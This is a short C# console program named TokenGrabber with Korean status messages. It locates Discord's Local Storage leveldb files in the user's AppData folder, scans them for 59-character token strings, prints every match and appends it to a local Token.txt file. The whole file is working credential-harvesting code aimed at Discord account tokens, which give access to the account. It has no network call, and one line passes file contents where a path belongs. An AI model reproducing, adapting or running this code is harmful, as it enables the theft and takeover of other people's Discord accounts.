using System;
using System.IO;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Net;


namespace TokenGrabber
{

    class Program
    {
        static List<string> files = new List<string>();
        static int tokenLength = 59;
        static void Main(string[] args)
        {
            Console.WriteLine("----------Start----------");

            files = GetFile();

            if (files.Count == 0)
            {
                Console.WriteLine("디스코드가 발견되지 않았습니다");
                return;
            }

            GetToken();


            Console.WriteLine("----------End----------");
            Console.ReadLine();


        }



        private static void GetToken()
        {
            foreach (string token in files)
            {
                foreach (Match match in Regex.Matches(token, "[^\"]*"))
                {
                    if (match.Length == tokenLength)
                    {
                        if (match.ToString().Contains("."))
                        {
                            Console.WriteLine($"Token = {match.ToString()}");
                            using (StreamWriter sw = new StreamWriter("Token.txt", true))
                            {
                                sw.WriteLine($"Token = {match.ToString()}");
                            }
                        }


                    } 
                }
            }
        }

        private static List<string> GetFile()
        {
            List<string> files = new List<string>();
            string discordPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";

            if (!Directory.Exists(discordPath))
            {
                Console.WriteLine("디스코드가 없으시군요!\n 디스코드 path 를 발견하지 못하였습니다.");
                return files;
            }
            string key = "token";
            string[] ldbFiles = System.IO.Directory.GetFiles(discordPath, "*.ldb");

            foreach (string ldb in ldbFiles)
            {
                string textFile = File.ReadAllText(ldb);

                if (textFile.Contains(key))
                {
                    Console.WriteLine($"{ Path.GetFileName(textFile)} 파일 찾음");
                    files.Add(textFile);
                }
            }


            return files;

        }

    }
}
